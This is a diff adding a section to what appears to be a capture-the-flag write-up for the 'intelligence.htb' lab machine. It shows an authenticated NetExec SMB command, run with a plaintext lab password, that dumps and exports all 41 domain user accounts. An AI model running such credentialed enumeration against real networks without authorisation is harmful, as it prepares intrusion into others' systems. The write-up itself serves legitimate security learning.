@@ -366,4 +366,56 @@ SMB         10.129.95.154   445    DC               NETLOGON        READ        
 SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
 SMB         10.129.95.154   445    DC               Users           READ
 ```
-Read access on quite a few share
+Read access on quite a few shares
+
+## Dumping all the users
+```python
+nxc smb dc.intelligence.htb -u tiffany.molina -p 'NewIntelligenceCorpUser9876' --users-export users.txt
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\tiffany.molina:NewIntelligenceCorpUser9876 
+SMB         10.129.95.154   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.95.154   445    DC               Administrator                 2021-04-19 00:18:37 0       Built-in account for administering the computer/domain 
+SMB         10.129.95.154   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.95.154   445    DC               krbtgt                        2021-04-19 00:42:42 0       Key Distribution Center Service Account 
+SMB         10.129.95.154   445    DC               Danny.Matthews                2021-04-19 00:49:34 0        
+SMB         10.129.95.154   445    DC               Jose.Williams                 2021-04-19 00:49:35 0        
+SMB         10.129.95.154   445    DC               Jason.Wright                  2021-04-19 00:49:36 0        
+SMB         10.129.95.154   445    DC               Samuel.Richardson             2021-04-19 00:49:37 0        
+SMB         10.129.95.154   445    DC               David.Mcbride                 2021-04-19 00:49:37 0        
+SMB         10.129.95.154   445    DC               Scott.Scott                   2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               David.Reed                    2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Ian.Duncan                    2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Michelle.Kent                 2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Jennifer.Thomas               2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Kaitlyn.Zimmerman             2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Travis.Evans                  2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Kelly.Long                    2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Nicole.Brock                  2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Stephanie.Young               2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               John.Coleman                  2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Thomas.Valenzuela             2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Thomas.Hall                   2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Brian.Baker                   2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Richard.Williams              2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Teresa.Williamson             2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               David.Wilson                  2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Darryl.Harris                 2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               William.Lee                   2021-04-19 00:49:40 0        
+SMB         10.129.95.154   445    DC               Thomas.Wise                   2021-04-19 00:49:40 0        
+SMB         10.129.95.154   445    DC               Veronica.Patel                2021-04-19 00:49:40 0        
+SMB         10.129.95.154   445    DC               Joel.Crawford                 2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Jean.Walter                   2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Anita.Roberts                 2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Brian.Morris                  2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Daniel.Shelton                2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Jessica.Moody                 2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Tiffany.Molina                2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               James.Curbow                  2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Jeremy.Mora                   2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Jason.Patterson               2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Laura.Lee                     2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Ted.Graves                    2021-04-19 00:49:42 0        
+SMB         10.129.95.154   445    DC               [*] Enumerated 41 local users: intelligence
+SMB         10.129.95.154   445    DC               [*] Writing 41 local users to users.txt
+```
+Dumped all the users
